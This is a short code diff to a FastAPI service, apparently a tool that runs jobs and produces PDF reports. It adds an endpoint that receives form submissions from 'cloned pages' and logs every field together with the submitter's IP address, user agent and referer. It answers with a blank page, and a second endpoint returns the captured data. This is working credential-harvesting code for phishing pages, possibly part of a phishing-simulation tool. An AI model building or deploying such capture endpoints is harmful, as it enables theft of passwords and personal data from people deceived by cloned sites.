@@ -6,7 +6,7 @@ from datetime import datetime, timezone
 
 from dotenv import load_dotenv
 from fastapi import FastAPI, HTTPException
-from fastapi.responses import FileResponse, RedirectResponse, Response
+from fastapi.responses import FileResponse, HTMLResponse, RedirectResponse, Response
 from fastapi.staticfiles import StaticFiles
 from report_generator import generate_pdf
 from slowapi import Limiter, _rate_limit_exceeded_handler
@@ -170,6 +170,39 @@ async def list_jobs() -> list[JobStatus]:
 @app.get("/health")
 async def health() -> dict:
     return {"status": "ok", "version": "1.0"}
+
+
+@app.post("/capture/{job_id}")
+async def capture_submission(request: Request, job_id: str) -> HTMLResponse:
+    """Receive form submissions from cloned pages, log them, return blank page."""
+    validate_job_id(job_id)
+
+    try:
+        form_data = await request.form()
+        submission = {
+            "job_id": job_id,
+            "fields": dict(form_data),
+            "ip_address": request.client.host,
+            "user_agent": request.headers.get("user-agent", ""),
+            "referer": request.headers.get("referer", ""),
+        }
+        storage.save_submission(job_id, submission)
+        logger.info(
+            "Captured submission for job %s: %s fields",
+            job_id,
+            len(submission["fields"]),
+        )
+    except Exception:
+        logger.exception("Failed to capture submission for job %s", job_id)
+
+    return HTMLResponse(content="<html><body></body></html>", status_code=200)
+
+
+@app.get("/submissions/{job_id}")
+async def get_submissions(job_id: str) -> list:
+    """Get all captured form submissions for a job."""
+    validate_job_id(job_id)
+    return storage.get_submissions(job_id)
 
 @app.get("/report/{job_id}/pdf")
 async def get_report_pdf(job_id: str) -> Response:
